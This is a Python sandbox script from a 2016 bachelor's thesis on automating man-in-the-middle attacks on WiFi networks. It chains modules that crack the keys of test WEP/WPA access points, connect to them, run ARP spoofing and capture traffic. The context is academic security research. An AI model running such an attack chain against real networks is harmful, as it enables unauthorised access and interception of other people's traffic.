#!/usr/bin/env python3
"""
sandbox file for testing available functionality

Automatization of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016
"""
import logging
import sys
import tempfile
import time
import warnings

import coloredlogs

from access import WirelessUnlocker, WirelessConnecter, list_wifi_interfaces
from capture import Dumpcap
from common import WirelessScanner
from topology import ArpSpoofing

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'

logger = logging.getLogger(__name__)
coloredlogs.install(level='DEBUG')
logging.captureWarnings(True)
warnings.simplefilter('always', ResourceWarning)


def main():
    logger.info("started")

    interface = None
    for i in list_wifi_interfaces():
        if i.name == 'wlp0s20u1u1':
            interface = i
            break

    with tempfile.TemporaryDirectory() as tmp_dirname:
        interface.start_monitor_mode()

        scanner = WirelessScanner(tmp_dir=tmp_dirname, interface=interface.name)
        scan = scanner.scan_once()

        interface.stop_monitor_mode()

        target = None
        print('Scan:')
        for ap in scan:
            print(ap)
            if ap.essid == 'test-wep-osa' or ap.essid == 'test-wep-ska' or ap.essid == 'test-wpa-psk':
                target = ap
                logger.info('scan found ' + target.essid)

        if target:
            interface.start_monitor_mode(target.channel)
            wireless_unlocker = WirelessUnlocker(ap=target, if_mon=interface.name)
            wireless_unlocker.start()
            interface.stop_monitor_mode()

            wireless_connecter = WirelessConnecter(interface=interface.name)
            wireless_connecter.connect(target)

            arp_spoofing = ArpSpoofing(interface=interface)
            arp_spoofing.start()
            logger.info('Running until KeyboardInterrupt.')
            try:
                with Dumpcap(interface=interface) as dumpcap:
                    while True:
                        arp_spoofing.update_state()
                        dumpcap.update()
                        time.sleep(1)

            except KeyboardInterrupt:
                logger.info('KeyboardInterrupt')
            arp_spoofing.stop()
            arp_spoofing.clean()
            wireless_connecter.disconnect()

    return 0


if __name__ == '__main__':
    status = main()
    sys.exit(status)
